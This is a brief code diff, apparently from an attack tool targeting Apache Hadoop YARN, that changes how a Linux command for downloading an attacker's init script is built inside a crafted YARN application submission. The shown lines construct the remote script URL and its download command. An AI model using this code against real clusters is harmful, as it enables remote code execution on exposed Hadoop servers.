@@ -64,7 +64,7 @@ createHadoopYarnApp := func() {
 appJsonData := func(appId) {
 
     initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
-    initDownloadCmd := attackScript.initCmdForLinux(initUrl)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,ApacheHadoopRestfullAttackType)
 
     jdata := {
         "application-id":appId,
